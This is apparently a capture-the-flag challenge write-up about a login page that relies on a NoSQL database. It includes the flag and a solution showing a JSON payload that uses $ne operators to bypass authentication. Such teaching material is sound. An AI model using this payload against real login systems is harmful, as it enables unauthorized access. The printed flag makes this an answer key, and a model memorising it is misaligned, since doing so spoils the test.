# No SQL Injection

**Description:** I have heard all about the issues that SQL injection attacks can cause. So I decided to not use a relational database system and use a **NoSQL** backend database instead. This way my secure website cannot be vulnerable to any SQL injection attacks! Can you test my login page to prove that I am correct and my website is secure?

The goal is to successfully login and view the admin page.

**Student Files:**
  - [students_no_sql_injection.zip](provided_files/students_no_sql_injection.zip)

**Flag:** CTF{w41t_y0u_c4n_iNj3cT_nO_sQlI_dB5_2???!??}

## Solution

* Vulnerable to NoSQLi authentication bypass.
* Example JSON payload

```json
{
  "username":{
    "$ne" : "somerandomname"
  },
  "password":{
    "$ne":"test"
  }
}
```
